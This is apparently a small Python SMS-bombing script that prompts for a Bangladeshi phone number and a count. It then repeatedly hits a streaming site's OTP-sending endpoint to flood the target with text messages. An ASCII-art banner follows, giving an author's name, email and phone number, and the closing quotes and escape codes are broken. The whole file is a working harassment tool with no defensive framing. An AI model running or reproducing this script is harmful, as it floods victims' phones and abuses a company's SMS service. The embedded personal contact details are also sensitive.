import requests

#GET
number=str(input(" Enter The Number : "))


api="https://stage.bioscopelive.com/en/login/send-otp?phone=88"+number+"operator=bd-otp"

amount=int(input(" Enter The Amount : "))

for i in range(amount):
	requests.get(api)
	print(str(i+1)+" SMS Sent")

███████╗███████╗███╗   ██╗ █████╗ ██╗   ██╗███████╗██╗     
██╔════╝██╔════╝████╗  ██║██╔══██╗╚██╗ ██╔╝██╔════╝██║     
███████╗█████╗  ██╔██╗ ██║███████║ ╚████╔╝ █████╗  ██║     
╚════██║██╔══╝  ██║╚██╗██║██╔══██║  ╚██╔╝  ██╔══╝  ██║     
███████║███████╗██║ ╚████║██║  ██║   ██║   ███████╗███████╗
╚══════╝╚══════╝╚═╝  ╚═══╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚══════			\033
__________________×______________________
  
  Owner   :  Senayel Islam
 
  Github   : MAGIC
 
  Facebook:SENAYEL ISLAM DIP
  
  EMAIL	  :Senayelislamdipdip5@gmail.com
  
  Contact : +8801914400137
__________________×______________________\033[1;37m""")
